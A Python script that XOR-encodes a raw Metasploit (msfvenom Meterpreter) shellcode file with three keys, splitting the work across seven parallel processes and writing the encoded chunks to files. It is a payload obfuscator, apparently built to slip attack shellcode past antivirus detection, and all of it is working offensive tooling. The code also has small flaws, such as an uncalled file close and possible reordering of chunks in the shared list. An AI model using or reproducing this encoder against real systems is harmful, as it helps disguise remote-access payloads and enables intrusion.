import ctypes, struct  
import os
import sys
from multiprocessing import Process, Manager






def loop(L,i,buf):
    msfshc = b""
    c=0
    for shbyte in buf:
        shbyte = shbyte ^ 0x12
        shbyte = shbyte ^ 0x56        
        shbyte = shbyte ^ 0x03
        msfshc+=struct.pack("B", shbyte)
        if i == 0:
            print("\r>> You have finished {}".format(c), end='') 
            c+=1
    f = open(str(i), "wb")
    f.write(bytes(msfshc))
    f.close

               
    L.insert(i, msfshc)
    print(i)




with Manager() as manager:

        file = open("met64.raw", "rb")  # msfvenom x86 shellcode file in raw format 
        buf = file.read()
        file.close()
        print(len(buf))
        lenpar = int(len(buf) /  7)
        # Create encoded metasploit payload
        print("total to be processed: " + str(lenpar))
  
        L = manager.list() 
        processes = []
        for i in range(7):
            
            if i == 0:
                buf1 = buf[0:lenpar]
            elif i == 1: 
                buf1 = buf[lenpar:2*lenpar]
            elif i == 2:
                buf1 = buf[2*lenpar:3*lenpar]
            elif i == 3:
                buf1 = buf[3*lenpar:4*lenpar]
            elif i == 4:
                buf1 = buf[4*lenpar:5*lenpar]  
            elif i == 5:
                buf1 = buf[5*lenpar:6*lenpar]
            elif i == 6:
                buf1 = buf[6*lenpar:]   

            p = Process(target=loop, args=(L,i,buf1))  # Passing the list
            p.start()
            processes.append(p)

        for p in processes:
            status = True 
            while status:
                status = p.is_alive()
            p.join()








